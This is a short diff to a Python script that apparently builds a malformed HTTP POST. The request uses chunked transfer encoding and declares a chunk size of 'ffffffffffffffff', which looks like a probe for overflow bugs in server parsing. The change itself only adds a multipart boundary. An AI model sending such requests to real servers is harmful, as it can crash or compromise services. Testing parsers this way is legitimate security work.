@@ -16,7 +16,7 @@ def main():
     sock.settimeout(60)
     s = "POST / HTTP/1.1\r\n"
     s += "Host: %s\r\n" % host
-    s += "Content-type: multipart/form-data\r\n"
+    s += "Content-type: multipart/form-data; boundary=--b3f1zid8kqwy\r\n"
     s += "Transfer-encoding: chunked\r\n"
     s += "\r\n"
     s += "ffffffffffffffff"
